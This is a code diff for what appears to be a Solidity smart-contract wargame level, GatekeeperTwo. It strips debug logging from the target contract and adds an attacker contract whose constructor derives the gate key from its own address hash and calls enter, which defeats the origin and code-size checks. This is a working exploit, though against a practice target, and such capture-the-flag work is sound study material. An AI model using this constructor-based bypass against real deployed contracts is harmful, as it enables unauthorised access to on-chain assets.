@@ -8,16 +8,15 @@ contract GatekeeperTwo {
     address public entrant;
 
     modifier gateOne() {
-        console.log("Inside gate one");
         require(msg.sender != tx.origin);
         _;
     }
 
     modifier gateTwo() {
-        console.log("Inside gate two");
         uint x;
-        assembly { x := extcodesize(caller()) }
-        console.log(x);
+        assembly { 
+            x := extcodesize(caller()) 
+        }
         require(x == 0);
         _;
     }
@@ -34,18 +33,11 @@ contract GatekeeperTwo {
 }
 
 contract TestGatekeeperTwo {
-
-
     GatekeeperTwo g;
     constructor(address _gatekeeperAddr) {
         g = GatekeeperTwo(_gatekeeperAddr);
-    }
-
-    event Hacked(uint256 gasBrute);
-
-    function attack() external {
-        bool success = g.enter(0x00);
-        console.log(success);
+        bytes8 _gateKey = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        g.enter(_gateKey);
     }
 }
 
